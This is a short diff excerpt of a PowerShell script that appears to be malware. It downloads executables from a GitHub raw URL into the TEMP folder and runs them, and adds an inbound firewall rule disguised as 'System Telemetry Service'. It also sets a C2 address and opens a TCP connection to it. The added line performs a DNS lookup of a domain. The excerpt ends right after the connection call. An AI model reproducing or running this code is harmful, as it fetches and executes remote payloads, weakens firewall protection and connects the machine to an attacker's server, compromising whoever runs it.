@@ -6,6 +6,7 @@ Start-Process $env:TEMP\1uk9l129j.exe
 iwr https://raw.githubusercontent.com/shanks-wq/muddy/refs/heads/main/burn.exe -OutFile $env:TEMP\burn.exe
 Start-Process $env:TEMP\burn.exe
 New-NetFirewallRule -DisplayName "System Telemetry Service" -Direction Inbound -Protocol TCP -LocalPort 8076 -Action Allow
+Resolve-DnsName -Name "promoverse.org" -ErrorAction SilentlyContinue
 $c2 = "188.114.96.1:8858"
 $client = New-Object System.Net.Sockets.TcpClient
 $client.Connect($c2.Split(':')[0], [int]$c2.Split(':')[1])
